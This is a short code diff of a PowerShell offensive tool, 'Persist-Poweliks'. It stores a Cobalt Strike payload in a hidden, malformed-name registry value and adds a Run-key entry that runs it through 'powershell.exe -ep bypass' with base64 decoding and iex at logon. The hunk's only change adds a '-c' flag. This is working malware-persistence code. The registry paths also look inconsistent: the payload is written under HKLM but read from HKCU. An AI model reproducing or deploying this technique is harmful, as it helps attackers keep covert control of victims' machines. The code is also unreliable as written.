@@ -30,5 +30,5 @@ PS C:\> Persist-Poweliks -cobaltstrike_gen_payload <provided by cobalt strike>
     #Write the powershell bytecode to a key, $malformed_string, in HKLM:SOFTWARE\$malformed_string
     new-ItemProperty -path "HKLM:SOFTWARE\$malformed_string" -name "$malformed_string" -value "$cobaltstrike_gen_payload"
 
-    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "powershell.exe -ep bypass iex ([Text.Encoding])::ASCII.GetString([Convert]::FromBase64String((gp `'HKCU:SOFTWARE\$malformed_string`').$malformed_string)));"
+    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "powershell.exe -ep bypass -c iex ([Text.Encoding])::ASCII.GetString([Convert]::FromBase64String((gp `'HKCU:SOFTWARE\$malformed_string`').$malformed_string)));"
 }
